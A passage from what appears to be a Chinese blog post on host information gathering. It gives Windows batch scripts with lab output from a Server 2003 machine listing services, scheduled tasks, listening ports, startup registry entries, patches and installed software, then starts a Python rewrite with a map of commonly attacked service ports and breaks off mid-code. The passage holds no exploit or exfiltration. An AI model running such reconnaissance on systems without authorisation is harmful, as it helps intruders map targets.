<h5 id="正在运行的服务-net-start"><a href="#正在运行的服务-net-start" class="headerlink" title="正在运行的服务 net start"></a>正在运行的服务 net start</h5><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> [+] 已经启动以下 Windows 服务:</span><br><span class="line"><span class="built_in">echo</span> --------------------------</span><br><span class="line"><span class="built_in">net</span> <span class="built_in">start</span> </span><br><span class="line"><span class="built_in">echo</span> --------------------------</span><br></pre></td></tr></table></figure>

<p>Output</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[+] 已经启动以下 Windows 服务:</span><br><span class="line">--------------------------</span><br><span class="line">已经启动以下 Windows 服务:</span><br><span class="line"></span><br><span class="line">   Application Experience Lookup Service</span><br><span class="line">   Automatic Updates</span><br><span class="line">   COM+ Event System</span><br><span class="line">   COM+ System Application</span><br><span class="line">   Computer Browser</span><br><span class="line">   Cryptographic Services</span><br><span class="line">   DCOM Server Process Launcher</span><br><span class="line">   DHCP Client</span><br><span class="line">   Distributed Link Tracking Client</span><br><span class="line">   Distributed Transaction Coordinator</span><br><span class="line">   DNS Client</span><br><span class="line">   Error Reporting Service</span><br><span class="line">   Event Log</span><br><span class="line">   Help and Support</span><br><span class="line">   IPSEC Services</span><br><span class="line">   Logical Disk Manager</span><br><span class="line">   Network Connections</span><br><span class="line">   Network Location Awareness (NLA)</span><br><span class="line">   Plug and Play</span><br><span class="line">   Print Spooler</span><br><span class="line">   Protected Storage</span><br><span class="line">   Remote Procedure Call (RPC)</span><br><span class="line">   Remote Registry</span><br><span class="line">   Secondary Logon</span><br><span class="line">   Security Accounts Manager</span><br><span class="line">   Server</span><br><span class="line">   Shell Hardware Detection</span><br><span class="line">   System Event Notification</span><br><span class="line">   Task Scheduler</span><br><span class="line">   TCP/IP NetBIOS Helper</span><br><span class="line">   Terminal Services</span><br><span class="line">   TP AutoConnect Service</span><br><span class="line">   VMware Alias Manager and Ticket Service</span><br><span class="line">   VMware Tools</span><br><span class="line">   VMware 物理磁盘助手服务</span><br><span class="line">   Windows Management Instrumentation</span><br><span class="line">   Windows Time</span><br><span class="line">   Wireless Configuration</span><br><span class="line">   Workstation</span><br><span class="line"></span><br><span class="line">命令成功完成。</span><br><span class="line"></span><br><span class="line">--------------------------</span><br></pre></td></tr></table></figure>

<h5 id="计划任务-1"><a href="#计划任务-1" class="headerlink" title="计划任务"></a>计划任务</h5><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="built_in">echo</span> Listing Scheduled Tasks...</span><br><span class="line"><span class="built_in">echo</span> --------------------------</span><br><span class="line">schtasks /query /fo table</span><br><span class="line"><span class="built_in">echo</span> --------------------------</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Output</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Listing Scheduled Tasks...</span><br><span class="line">--------------------------</span><br><span class="line">信息: 系统里没有计划任务。</span><br><span class="line">--------------------------</span><br></pre></td></tr></table></figure>

<h5 id="开放端口-1"><a href="#开放端口-1" class="headerlink" title="开放端口"></a>开放端口</h5><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> Listing Open Ports...</span><br><span class="line"><span class="built_in">echo</span> ---------------------</span><br><span class="line">netstat -ano | <span class="built_in">find</span> &quot;LISTENING&quot;</span><br><span class="line"><span class="built_in">echo</span> ---------------------</span><br></pre></td></tr></table></figure>

<p>Output</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Listing Open Ports...</span><br><span class="line">---------------------</span><br><span class="line">  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       716</span><br><span class="line">  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4</span><br><span class="line">  TCP    0.0.0.0:1027           0.0.0.0:0              LISTENING       428</span><br><span class="line">  TCP    192.168.181.137:139    0.0.0.0:0              LISTENING       4</span><br><span class="line">---------------------</span><br></pre></td></tr></table></figure>

<h5 id="自启动项-1"><a href="#自启动项-1" class="headerlink" title="自启动项"></a>自启动项</h5><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="built_in">echo</span> Checking Registry Startup Items...</span><br><span class="line"><span class="built_in">echo</span> --------------------------------</span><br><span class="line"><span class="built_in">echo</span> [+] Current User Run:</span><br><span class="line">reg query &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Run&quot; | <span class="built_in">findstr</span> /i &quot;REG_SZ&quot;</span><br><span class="line"><span class="built_in">echo</span> --------------------------------</span><br><span class="line"><span class="built_in">echo</span> [+] Current User RunOnce:</span><br><span class="line">reg query &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce&quot; | <span class="built_in">findstr</span> /i &quot;REG_SZ&quot;</span><br><span class="line"><span class="built_in">echo</span> --------------------------------</span><br><span class="line"><span class="built_in">echo</span> [+] Local Machine Run:</span><br><span class="line">reg query &quot;HKLM\Software\Microsoft\Windows\CurrentVersion\Run&quot; | <span class="built_in">findstr</span> /i &quot;REG_SZ&quot;</span><br><span class="line"><span class="built_in">echo</span> --------------------------------</span><br><span class="line"><span class="built_in">echo</span> [+] Local Machine RunOnce:</span><br><span class="line">reg query &quot;HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce&quot; | <span class="built_in">findstr</span> /i &quot;REG_SZ&quot;</span><br><span class="line"><span class="built_in">echo</span> --------------------------------</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Output</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Checking Registry Startup Items...</span><br><span class="line">--------------------------------</span><br><span class="line">[+] Current User Run:</span><br><span class="line">    ctfmon.exe    REG_SZ    C:\WINDOWS\system32\ctfmon.exe</span><br><span class="line">--------------------------------</span><br><span class="line">[+] Current User RunOnce:</span><br><span class="line">--------------------------------</span><br><span class="line">[+] Local Machine Run:</span><br><span class="line">    IMJPMIG8.1    REG_SZ    &quot;C:\WINDOWS\IME\imjp8_1\IMJPMIG.EXE&quot; /Spoil /RemAdvD</span><br><span class="line">ef /Migration32</span><br><span class="line">    IMEKRMIG6.1    REG_SZ    C:\WINDOWS\ime\imkr6_1\IMEKRMIG.EXE</span><br><span class="line">    PHIME2002ASync    REG_SZ    C:\WINDOWS\system32\IME\TINTLGNT\TINTSETP.EXE /S</span><br><span class="line">YNC</span><br><span class="line">    PHIME2002A    REG_SZ    C:\WINDOWS\system32\IME\TINTLGNT\TINTSETP.EXE /IMENa</span><br><span class="line">me</span><br><span class="line">    VMware User Process    REG_SZ    &quot;C:\Program Files\VMware\VMware Tools\vmtoo</span><br><span class="line">lsd.exe&quot; -n vmusr</span><br><span class="line">--------------------------------</span><br><span class="line">[+] Local Machine RunOnce:</span><br><span class="line">--------------------------------</span><br></pre></td></tr></table></figure>



<h4 id="Win2003-bat脚本"><a href="#Win2003-bat脚本" class="headerlink" title="Win2003 bat脚本"></a>Win2003 bat脚本</h4><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> [+] 系统信息:</span><br><span class="line">systeminfo | <span class="built_in">findstr</span> /i  /c:&quot;主机名&quot; /c:&quot;OS 名称&quot; /c:&quot;OS 版本&quot; </span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> [+] IP地址:</span><br><span class="line"><span class="keyword">for</span> /f &quot;tokens=<span class="number">2</span> delims=:&quot; <span class="variable">%%a</span> <span class="keyword">in</span> (&#x27;<span class="built_in">ipconfig</span> ^| <span class="built_in">find</span> &quot;IP Address&quot;&#x27;) <span class="keyword">do</span> <span class="built_in">echo</span> <span class="variable">%%a</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> [+] 列出已安装的修复补丁:</span><br><span class="line">systeminfo | <span class="built_in">findstr</span> /i /c:&quot;修补程序:&quot;</span><br><span class="line"></span><br><span class="line"><span class="built_in">setlocal</span> EnableDelayedExpansion</span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">REM 运行 systeminfo 命令并将结果保存到临时文件</span></span><br><span class="line">systeminfo &gt; systeminfo_output.txt</span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">REM 遍历文件内容</span></span><br><span class="line"><span class="built_in">set</span> &quot;findPatch=false&quot;</span><br><span class="line"><span class="keyword">for</span> /f &quot;tokens=<span class="number">1</span>,* delims=:&quot; <span class="variable">%%a</span> <span class="keyword">in</span> (&#x27;<span class="built_in">type</span> systeminfo_output.txt&#x27;) <span class="keyword">do</span> (</span><br><span class="line"><span class="comment">    REM 找到包含 &quot;修补程序&quot; 的行</span></span><br><span class="line">    <span class="keyword">if</span> &quot;<span class="variable">!findPatch!</span>&quot;==&quot;true&quot; (</span><br><span class="line"><span class="comment">        REM 输出当前行</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">%%a</span>:<span class="variable">%%b</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        REM 提取行中的数字</span></span><br><span class="line">        <span class="built_in">set</span> &quot;num=<span class="variable">%%b</span>&quot;</span><br><span class="line">        <span class="built_in">set</span> &quot;num=<span class="variable">!num:~1,1!</span>&quot;</span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        REM 输出接下来的 X 行内容</span></span><br><span class="line">        <span class="keyword">for</span> /l <span class="variable">%%i</span> <span class="keyword">in</span> (<span class="number">1</span>, <span class="number">1</span>, <span class="variable">!num!</span>) <span class="keyword">do</span> (</span><br><span class="line">            <span class="built_in">set</span> /p &quot;outputLine=&quot;</span><br><span class="line">            <span class="built_in">echo</span> <span class="variable">!outputLine!</span></span><br><span class="line">        )</span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        REM 设置标志为 false，表示不再继续寻找 &quot;修补程序&quot;</span></span><br><span class="line">        <span class="built_in">set</span> &quot;findPatch=false&quot;</span><br><span class="line">    )</span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    REM 找到 &quot;修补程序&quot; 行，设置标志为 true</span></span><br><span class="line">    <span class="keyword">if</span> /i &quot;<span class="variable">%%a</span>&quot;==&quot;修补程序&quot; <span class="built_in">set</span> &quot;findPatch=true&quot;</span><br><span class="line">)</span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">REM 删除临时文件</span></span><br><span class="line"><span class="built_in">del</span> systeminfo_output.txt</span><br><span class="line"></span><br><span class="line"><span class="built_in">endlocal</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">setlocal</span> enabledelayedexpansion</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> [+] 列出已安装的应用程序:</span><br><span class="line"><span class="comment">rem echo [+] 列出 HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall</span></span><br><span class="line"><span class="keyword">for</span> /f &quot;tokens=*&quot; <span class="variable">%%a</span> <span class="keyword">in</span> (&#x27;reg query &quot;HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall&quot; <span class="number">2</span>^&gt;<span class="built_in">nul</span>&#x27;) <span class="keyword">do</span> (</span><br><span class="line">    <span class="built_in">set</span> &quot;subkey=<span class="variable">%%a</span>&quot;</span><br><span class="line">    <span class="built_in">set</span> &quot;display_name=&quot;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> /f &quot;tokens=<span class="number">2</span>,*&quot; <span class="variable">%%b</span> <span class="keyword">in</span> (&#x27;reg query &quot;<span class="variable">!subkey!</span>&quot; /v DisplayName <span class="number">2</span>^&gt;<span class="built_in">nul</span> ^| <span class="built_in">find</span> &quot;REG_SZ&quot; <span class="number">2</span>^&gt;<span class="built_in">nul</span>&#x27;) <span class="keyword">do</span> (</span><br><span class="line">        <span class="built_in">set</span> &quot;display_name=<span class="variable">%%c</span>&quot;</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">defined</span> display_name (</span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">!display_name!</span></span><br><span class="line">    )</span><br><span class="line">)</span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">rem echo [+] 列出 HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall</span></span><br><span class="line"><span class="keyword">for</span> /f &quot;tokens=*&quot; <span class="variable">%%a</span> <span class="keyword">in</span> (&#x27;reg query &quot;HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall&quot; <span class="number">2</span>^&gt;<span class="built_in">nul</span>&#x27;) <span class="keyword">do</span> (</span><br><span class="line">    <span class="built_in">set</span> &quot;subkey=<span class="variable">%%a</span>&quot;</span><br><span class="line">    <span class="built_in">set</span> &quot;display_name=&quot;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> /f &quot;tokens=<span class="number">2</span>,*&quot; <span class="variable">%%b</span> <span class="keyword">in</span> (&#x27;reg query &quot;<span class="variable">!subkey!</span>&quot; /v DisplayName <span class="number">2</span>^&gt;<span class="built_in">nul</span> ^| <span class="built_in">find</span> &quot;REG_SZ&quot; <span class="number">2</span>^&gt;<span class="built_in">nul</span>&#x27;) <span class="keyword">do</span> (</span><br><span class="line">        <span class="built_in">set</span> &quot;display_name=<span class="variable">%%c</span>&quot;</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">defined</span> display_name (</span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">!display_name!</span></span><br><span class="line">    )</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="built_in">endlocal</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> --------------------------</span><br><span class="line"><span class="built_in">echo</span> [+] 列出运行的服务:</span><br><span class="line"><span class="built_in">net</span> <span class="built_in">start</span> </span><br><span class="line"><span class="built_in">echo</span> --------------------------</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> --------------------------</span><br><span class="line"><span class="comment">rem 这里需要管理员权限 普通用户没权限</span></span><br><span class="line">schtasks /query /fo table</span><br><span class="line"><span class="built_in">echo</span> --------------------------</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> ---------------------</span><br><span class="line"><span class="built_in">echo</span> [+] 列出监听的端口:</span><br><span class="line">netstat -ano | <span class="built_in">find</span> &quot;LISTENING&quot;</span><br><span class="line"><span class="built_in">echo</span> ---------------------</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> [+] 列出主机中的自启动项:</span><br><span class="line"><span class="built_in">echo</span> --------------------------------</span><br><span class="line"><span class="comment">rem echo [+] Current User Run:</span></span><br><span class="line">reg query &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Run&quot; | <span class="built_in">findstr</span> /i &quot;REG_SZ&quot;</span><br><span class="line"><span class="built_in">echo</span> --------------------------------</span><br><span class="line"><span class="comment">rem echo [+] Current User RunOnce:</span></span><br><span class="line">reg query &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce&quot; | <span class="built_in">findstr</span> /i &quot;REG_SZ&quot;</span><br><span class="line"><span class="built_in">echo</span> --------------------------------</span><br><span class="line"><span class="comment">rem echo [+] Local Machine Run:</span></span><br><span class="line">reg query &quot;HKLM\Software\Microsoft\Windows\CurrentVersion\Run&quot; | <span class="built_in">findstr</span> /i &quot;REG_SZ&quot;</span><br><span class="line"><span class="built_in">echo</span> --------------------------------</span><br><span class="line"><span class="comment">rem echo [+] Local Machine RunOnce:</span></span><br><span class="line">reg query &quot;HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce&quot; | <span class="built_in">findstr</span> /i &quot;REG_SZ&quot;</span><br><span class="line"><span class="built_in">echo</span> --------------------------------</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>schtasks /query /fo table 也需要管理员权限 所以存在问题 待完善</p>
<p>Output</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Documents and Settings\test123\桌面&gt;1.bat</span><br><span class="line">[+] 系统信息:</span><br><span class="line">主机名:           TEST-C52232A016                                             </span><br><span class="line">OS 名称:          Microsoft(R) Windows(R) Server 2003, Enterprise Edition</span><br><span class="line">OS 版本:          5.2.3790 Service Pack 2 Build 3790</span><br><span class="line">BIOS 版本:        INTEL  - 6040000</span><br><span class="line">[+] IP地址:</span><br><span class="line"> 192.168.181.137</span><br><span class="line">[+] 列出已安装的修复补丁:</span><br><span class="line">修补程序:         安装了 1 个修补程序。                                       </span><br><span class="line">                  [01]: Q147222                                               </span><br><span class="line">[+] 列出已安装的应用程序:</span><br><span class="line">Microsoft Visual C++ 2008 Redistributable - x86 9.0.30729.4148</span><br><span class="line">Python 3.4.4</span><br><span class="line">VMware Tools</span><br><span class="line">--------------------------</span><br><span class="line">已经启动以下 Windows 服务:</span><br><span class="line"></span><br><span class="line">   Application Experience Lookup Service</span><br><span class="line">   Automatic Updates</span><br><span class="line">   COM+ Event System</span><br><span class="line">   COM+ System Application</span><br><span class="line">   Computer Browser</span><br><span class="line">   Cryptographic Services</span><br><span class="line">   DCOM Server Process Launcher</span><br><span class="line">   DHCP Client</span><br><span class="line">   Distributed Link Tracking Client</span><br><span class="line">   Distributed Transaction Coordinator</span><br><span class="line">   DNS Client</span><br><span class="line">   Error Reporting Service</span><br><span class="line">   Event Log</span><br><span class="line">   Help and Support</span><br><span class="line">   IPSEC Services</span><br><span class="line">   Logical Disk Manager</span><br><span class="line">   Network Connections</span><br><span class="line">   Network Location Awareness (NLA)</span><br><span class="line">   Plug and Play</span><br><span class="line">   Print Spooler</span><br><span class="line">   Protected Storage</span><br><span class="line">   Remote Procedure Call (RPC)</span><br><span class="line">   Remote Registry</span><br><span class="line">   Secondary Logon</span><br><span class="line">   Security Accounts Manager</span><br><span class="line">   Server</span><br><span class="line">   Shell Hardware Detection</span><br><span class="line">   System Event Notification</span><br><span class="line">   Task Scheduler</span><br><span class="line">   TCP/IP NetBIOS Helper</span><br><span class="line">   Terminal Services</span><br><span class="line">   TP AutoConnect Service</span><br><span class="line">   VMware Alias Manager and Ticket Service</span><br><span class="line">   VMware Tools</span><br><span class="line">   VMware 物理磁盘助手服务</span><br><span class="line">   Windows Management Instrumentation</span><br><span class="line">   Windows Time</span><br><span class="line">   Wireless Configuration</span><br><span class="line">   Workstation</span><br><span class="line"></span><br><span class="line">命令成功完成。</span><br><span class="line"></span><br><span class="line">--------------------------</span><br><span class="line">--------------------------</span><br><span class="line">错误: 拒绝访问。</span><br><span class="line">--------------------------</span><br><span class="line">---------------------</span><br><span class="line">  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       716</span><br><span class="line">  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4</span><br><span class="line">  TCP    0.0.0.0:1027           0.0.0.0:0              LISTENING       428</span><br><span class="line">  TCP    192.168.181.137:139    0.0.0.0:0              LISTENING       4</span><br><span class="line">---------------------</span><br><span class="line">---------------------</span><br><span class="line">[+] 列出主机中的自启动项:</span><br><span class="line">--------------------------------</span><br><span class="line">    ctfmon.exe    REG_SZ    C:\WINDOWS\system32\ctfmon.exe</span><br><span class="line">--------------------------------</span><br><span class="line">--------------------------------</span><br><span class="line">    IMJPMIG8.1    REG_SZ    &quot;C:\WINDOWS\IME\imjp8_1\IMJPMIG.EXE&quot; /Spoil /RemAdvD</span><br><span class="line">ef /Migration32</span><br><span class="line">    IMEKRMIG6.1    REG_SZ    C:\WINDOWS\ime\imkr6_1\IMEKRMIG.EXE</span><br><span class="line">    PHIME2002ASync    REG_SZ    C:\WINDOWS\system32\IME\TINTLGNT\TINTSETP.EXE /S</span><br><span class="line">YNC</span><br><span class="line">    PHIME2002A    REG_SZ    C:\WINDOWS\system32\IME\TINTLGNT\TINTSETP.EXE /IMENa</span><br><span class="line">me</span><br><span class="line">    VMware User Process    REG_SZ    &quot;C:\Program Files\VMware\VMware Tools\vmtoo</span><br><span class="line">lsd.exe&quot; -n vmusr</span><br><span class="line">--------------------------------</span><br><span class="line">--------------------------------</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<hr>
<h3 id="Version2"><a href="#Version2" class="headerlink" title="Version2"></a>Version2</h3><p>考虑到全版本兼容 重新写了个 但是收集信息有限</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> platform</span><br><span class="line"><span class="keyword">import</span> winreg</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">service_port_mapping = &#123;</span><br><span class="line">    <span class="number">21</span>: <span class="string">&quot;FTP/TFTP/VSFTPD (File Transfer Protocol)&quot;</span>,</span><br><span class="line">    <span class="number">22</span>: <span class="string">&quot;SSH (Secure Shell)&quot;</span>,</span><br><span class="line">    <span class="number">23</span>: <span class="string">&quot;Telnet (Remote Connection)&quot;</span>,</span><br><span class="line">    <span class="number">25</span>: <span class="string">&quot;SMTP (Email)&quot;</span>,</span><br><span class="line">    <span class="number">53</span>: <span class="string">&quot;DNS (Domain Name System)&quot;</span>,</span><br><span class="line">    <span class="number">67</span>: <span class="string">&quot;DHCP (Dynamic Host Configuration Protocol)&quot;</span>,</span><br><span class="line">    <span class="number">68</span>: <span class="string">&quot;DHCP (Dynamic Host Configuration Protocol)&quot;</span>,</span><br><span class="line">    <span class="number">110</span>: <span class="string">&quot;POP3 (Email)&quot;</span>,</span><br><span class="line">    <span class="number">123</span>: <span class="string">&quot;NTP&quot;</span>,</span><br><span class="line">    <span class="number">135</span>: <span class="string">&quot;RPC（Remote Procedure Call)&quot;</span>,</span><br><span class="line">    <span class="number">137</span>: <span class="string">&quot;Samba (File Sharing)&quot;</span>,</span><br><span class="line">    <span class="number">139</span>: <span class="string">&quot;Samba (File Sharing)&quot;</span>,</span><br><span class="line">    <span class="number">143</span>: <span class="string">&quot;IMAP (Email)&quot;</span>,</span><br><span class="line">    <span class="number">161</span>: <span class="string">&quot;SNMP (Simple Network Management Protocol)&quot;</span>,</span><br><span class="line">    <span class="number">389</span>: <span class="string">&quot;LDAP (Lightweight Directory Access Protocol)&quot;</span>,</span><br><span class="line">    <span class="number">445</span>: <span class="string">&quot;SMB (Server Message Block)&quot;</span>,</span><br><span class="line">    <span class="number">512</span>: <span class="string">&quot;Linux Rexec (Remote Execution Service)&quot;</span>,</span><br><span class="line">    <span class="number">513</span>: <span class="string">&quot;Linux Rexec (Remote Execution Service)&quot;</span>,</span><br><span class="line">    <span class="number">514</span>: <span class="string">&quot;Linux Rexec (Remote Execution Service)&quot;</span>,</span><br><span class="line">    <span class="number">873</span>: <span class="string">&quot;Rsync (Remote File Synchronization)&quot;</span>,</span><br><span class="line">    <span class="number">1080</span>: <span class="string">&quot;Socket&quot;</span>,</span><br><span class="line">    <span class="number">1098</span>: <span class="string">&quot;JAVARMI&quot;</span>,</span><br><span class="line">    <span class="number">1352</span>: <span class="string">&quot;Lotus Domino (Email)&quot;</span>,</span><br><span class="line">    <span class="number">1433</span>: <span class="string">&quot;MSSQL (Microsoft SQL Server)&quot;</span>,</span><br><span class="line">    <span class="number">1521</span>: <span class="string">&quot;Oracle Database&quot;</span>,</span><br><span class="line">    <span class="number">2049</span>: <span class="string">&quot;NFS (Network File System)&quot;</span>,</span><br><span class="line">    <span class="number">2181</span>: <span class="string">&quot;Zookeeper&quot;</span>,</span><br><span class="line">    <span class="number">2222</span>: <span class="string">&quot;DA&quot;</span>,</span><br><span class="line">    <span class="number">2375</span>: <span class="string">&quot;Docker Remote API&quot;</span>,</span><br><span class="line">    <span class="number">2601</span>: <span class="string">&quot;zebra&quot;</span>,</span><br><span class="line">    <span class="number">3306</span>: <span class="string">&quot;MySQL Database&quot;</span>,</span><br><span class="line">    <span class="number">3128</span>: <span class="string">&quot;squid&quot;</span>,</span><br><span class="line">    <span class="number">3389</span>: <span class="string">&quot;RDP (Remote Desktop Protocol)&quot;</span>,</span><br><span class="line">    <span class="number">4100</span>: <span class="string">&quot;SysBase&quot;</span>,</span><br><span class="line">    <span class="number">4440</span>: <span class="string">&quot;rundeck&quot;</span>,</span><br><span class="line">    <span class="number">4848</span>: <span class="string">&quot;GlassFish Console&quot;</span>,</span><br><span class="line">    <span class="number">5000</span>: <span class="string">&quot;Sybase/DB2 Database&quot;</span>,</span><br><span class="line">    <span class="number">5422</span>: <span class="string">&quot;PostgreSQL Database&quot;</span>,</span><br><span class="line">    <span class="number">5432</span>: <span class="string">&quot;PostgreSQL Database&quot;</span>,</span><br><span class="line">    <span class="number">5632</span>: <span class="string">&quot;PCAnywhere Service&quot;</span>,</span><br><span class="line">    <span class="number">5900</span>: <span class="string">&quot;VNC (Virtual Network Computing)&quot;</span>,</span><br><span class="line">    <span class="number">5984</span>: <span class="string">&quot;CouchDB&quot;</span>,</span><br><span class="line">    <span class="number">6082</span>: <span class="string">&quot;Varnish&quot;</span>,</span><br><span class="line">    <span class="number">6379</span>: <span class="string">&quot;Redis Database&quot;</span>,</span><br><span class="line">    <span class="number">7001</span>: <span class="string">&quot;WebLogic&quot;</span>,</span><br><span class="line">    <span class="number">7002</span>: <span class="string">&quot;WebLogic&quot;</span>,</span><br><span class="line">    <span class="number">80</span>: <span class="string">&quot;HTTP&quot;</span>,</span><br><span class="line">    <span class="number">443</span>: <span class="string">&quot;HTTPS&quot;</span>,</span><br><span class="line">    <span class="number">8000</span>: <span class="string">&quot;Jdwp&quot;</span>,</span><br><span class="line">    <span class="number">8069</span>: <span class="string">&quot;Zabbix&quot;</span>,</span><br><span class="line">    <span class="number">8161</span>: <span class="string">&quot;ActiveMQ&quot;</span>,</span><br><span class="line">    <span class="number">8080</span>: <span class="string">&quot;Jboss/Tomcat/Resin/GlassFish/Jenkins/Jetty&quot;</span>,</span><br><span class="line">    <span class="number">8089</span>: <span class="string">&quot;Jboss/Tomcat/Resin/GlassFish/Jenkins/Jetty&quot;</span>,</span><br><span class="line">    <span class="number">8083</span>: <span class="string">&quot;InfluxDB&quot;</span>,</span><br><span class="line">    <span class="number">8086</span>: <span class="string">&quot;InfluxDB&quot;</span>,</span><br><span class="line">    <span class="number">8980</span>: <span class="string">&quot;OpenNMS&quot;</span>,</span><br><span class="line">    <span class="number">9000</span>: <span class="string">&quot;FastCGI&quot;</span>,</span><br><span class="line">    <span class="number">9080</span>: <span class="string">&quot;Websphere Console&quot;</span>,</span><br><span class="line">    <span class="number">9090</span>: <span class="string">&quot;Websphere Console&quot;</span>,</span><br><span class="line">    <span class="number">9200</span>: <span class="string">&quot;Elasticsearch&quot;</span>,</span><br><span class="line">    <span class="number">9300</span>: <span class="string">&quot;Elasticsearch&quot;</span>,</span><br><span class="line">    <span class="number">11211</span>: <span class="string">&quot;Memcached&quot;</span>,</span><br><span class="line">    <span class="number">27017</span>: <span class="string">&quot;MongoDB&quot;</span>,</span><br><span class="line">    <span class="number">27018</span>: <span class="string">&quot;MongoDB&quot;</span>,</span><br><span class="line">    <span class="number">50000</span>: <span class="string">&quot;SAP&quot;</span>,</span><br><span class="line">    <span class="number">50010</span>: <span class="string">&quot;Hadoop&quot;</span>,</span><br><span class="line">    <span class="number">50030</span>: <span class="string">&quot;Hadoop&quot;</span>,</span><br><span class="line">    <span class="number">50070</span>: <span class="string">&quot;Hadoop&quot;</span>,</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_startup_items</span>(<span class="params">hive, subkey</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        key = winreg.OpenKey(hive, subkey, <span class="number">0</span>, winreg.KEY_READ)</span><br><span class="line"></span><br><span class="line">        startup_items = &#123;&#125;</span><br><span class="line">        index = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                name, value, _ = winreg.EnumValue(key, index)</span><br><span class="line">                startup_items[name] = value</span><br><span class="line">                index += <span class="number">1</span></span><br><span class="line">            <span class="keyword">except</span> OSError:</span><br><span class="line">                <span class="comment"># 到达注册表末尾</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> startup_items</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># print(&quot;[-] Error: &#123;&#125;&quot;.format(e))</span></span><br><span class="line">        <span class="keyword">return</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取 HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span></span><br><span class="line">startup_items_current_user_run = get_startup_items(winreg.HKEY_CURRENT_USER, <span class="string">r&quot;SOFTWARE\Microsoft\Windows\CurrentVersion\Run&quot;</span>)</span><br><span class="line"><span class="comment"># 读取 HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce</span></span><br><span class="line">startup_items_current_user_runonce = get_startup_items(winreg.HKEY_CURRENT_USER, <span class="string">r&quot;SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce&quot;</span>)</span><br><span class="line"><span class="comment"># 读取 HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span></span><br><span class="line">startup_items_local_machine_run = get_startup_items(winreg.HKEY_LOCAL_MACHINE, <span class="string">r&quot;SOFTWARE\Microsoft\Windows\CurrentVersion\Run&quot;</span>)</span><br><span class="line"><span class="comment"># 读取 HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce</span></span><br><span 